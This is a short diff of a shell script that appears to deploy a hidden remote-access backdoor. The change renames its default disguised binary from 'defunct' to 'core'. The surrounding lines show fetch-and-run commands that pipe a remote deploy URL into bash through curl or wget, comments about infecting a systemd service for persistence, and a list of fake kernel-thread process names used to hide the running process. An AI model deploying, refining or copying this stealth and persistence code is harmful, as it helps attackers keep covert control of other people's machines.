@@ -45,7 +45,7 @@
 #       - Try NO to infect a systemd service before any other persistency
 # GS_NAME="[kcached]"
 #       - Specify custom hidden name file & process. Default is picked at random.
-# GS_BIN="defunct"
+# GS_BIN="core"
 #       - Specify custom name for binary on filesystem
 #       - Set to GS_NAME if GS_NAME is specified.
 # GS_DL=wget
@@ -131,7 +131,7 @@ unset msg
 
 DL_CRL="bash -c \"\$(curl -fsSL $URL_DEPLOY)\""
 DL_WGT="bash -c \"\$(wget -qO- $URL_DEPLOY)\""
-BIN_HIDDEN_NAME_DEFAULT="defunct"
+BIN_HIDDEN_NAME_DEFAULT="core"
 # Can not use '[kcached/0]'. Bash without bashrc shows "/0] $" as prompt. 
 proc_name_arr=("[kstrp]" "[watchdogd]" "[ksmd]" "[kswapd0]" "[card0-crtc8]" "[mm_percpu_wq]" "[rcu_preempt]" "[kworker]" "[raid5wq]" "[slub_flushwq]" "[netns]" "[kaluad]")
 # Pick a process name at random
